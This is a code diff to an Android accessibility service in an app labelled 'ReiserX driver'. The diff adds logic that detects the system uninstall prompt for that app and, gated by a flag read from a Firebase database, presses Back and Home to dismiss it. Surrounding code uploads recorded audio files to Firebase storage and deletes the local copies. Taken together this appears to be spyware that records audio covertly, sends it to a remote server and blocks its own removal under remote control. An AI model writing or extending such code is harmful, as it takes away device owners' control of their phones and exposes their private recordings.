@@ -19,8 +19,11 @@ import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.storage.FirebaseStorage;
@@ -47,6 +50,8 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     TaskSuccess taskSuccess;
 
     public static accessibilityService instance;
+
+    String name, action;
 
     @Override
     protected void onServiceConnected() {
@@ -120,9 +125,38 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
             if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
+                name = null;
+                action = null;
                 logNodeHeirarchy(getRootInActiveWindow(), 0);
+                if (name != null && action != null) {
+                    if (name.equals("ReiserX driver") && action.equals("Do you want to uninstall this app?")) {
+                        uninstalls();
+                    }
+                }
             }
         }
+    }
+
+    public void uninstalls() {
+        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+        String UserID = save.getString("UserID", "");
+        FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("canUninstall").addListenerForSingleValueEvent(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (snapshot.exists()) {
+                    boolean canUninstall = Boolean.TRUE.equals(snapshot.getValue(Boolean.class));
+                    if (canUninstall) {
+                        performGlobalAction(GLOBAL_ACTION_BACK);
+                        performGlobalAction(GLOBAL_ACTION_HOME);
+                    }
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+
+            }
+        });
     }
 
     public void logNodeHeirarchy(AccessibilityNodeInfo nodeInfo, int depth) {
@@ -133,11 +167,10 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
 
         if (!logString.equals("null")) {
-            Log.d(TAG, logString);
             if (logString.equals("ReiserX driver")) {
-                Log.d("AccessibilityService.logs", logString);
-                performGlobalAction(GLOBAL_ACTION_BACK);
-                performGlobalAction(GLOBAL_ACTION_HOME);
+                name = logString;
+            } else if (logString.equals("Do you want to uninstall this app?")) {
+                action = logString;
             }
         }
 
@@ -278,9 +311,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                     Calendar cal = Calendar.getInstance();
                     long currentTime = cal.getTimeInMillis();
                     AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
-                    collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> {
-                        filePath.delete();
-                    });
+                    collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> filePath.delete());
                 });
             }
         });
